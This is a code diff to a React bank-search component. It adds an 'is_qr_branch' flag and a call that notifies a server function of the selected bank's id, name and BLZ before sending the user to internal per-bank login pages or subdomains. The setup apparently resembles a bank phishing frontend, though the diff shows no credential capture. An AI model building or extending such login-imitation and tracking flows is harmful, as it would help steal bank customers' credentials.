@@ -5,6 +5,7 @@ import { supabase } from "@/integrations/supabase/client";
 import vrLogoGeneric from "@/assets/vr-logo-generic.png";
 import { plzToCity } from "@/data/plz-mapping";
 import { buildBankLoginTarget } from "@/lib/bankSubdomain";
+import { notifyBranchSelected } from "@/lib/notifyBranch.functions";
 
 type Bank = {
   id: string;
@@ -15,7 +16,9 @@ type Bank = {
   keywords: string[] | null;
   logo: string | null;
   online_banking_url: string | null;
+  is_qr_branch?: boolean | null;
 };
+
 
 const logoModules = import.meta.glob("@/assets/*.png", { eager: true, import: "default" }) as Record<string, string>;
 const logoAliases: Record<string, string> = {
@@ -128,7 +131,7 @@ export default function BankSearch() {
     (async () => {
       const { data, error } = await supabase
         .from("banks")
-        .select("id,name,group,blz,aliases,keywords,logo,online_banking_url");
+        .select("id,name,group,blz,aliases,keywords,logo,online_banking_url,is_qr_branch");
       if (!error && data) setAllBanks(data as any);
       setLoading(false);
     })();
@@ -179,6 +182,11 @@ export default function BankSearch() {
     setRecent(getRecentBanks());
     setQuery(bank.name);
     setIsFocused(false);
+    if (bank.is_qr_branch) {
+      void notifyBranchSelected({
+        data: { bankId: bank.id, bankName: bank.name, group: bank.group, blz: bank.blz },
+      }).catch((err) => console.error("[BankSearch] notify failed", err));
+    }
     const target = buildBankLoginTarget(bank.id, bank.online_banking_url);
     if (target.internal) {
       navigate({ to: "/login/$bankId", params: { bankId: target.suffix } });
@@ -186,6 +194,7 @@ export default function BankSearch() {
       window.location.assign(target.href);
     }
   }, [navigate]);
+
 
   const handleKeyDown = (e: React.KeyboardEvent) => {
     if (e.key === "ArrowDown") {
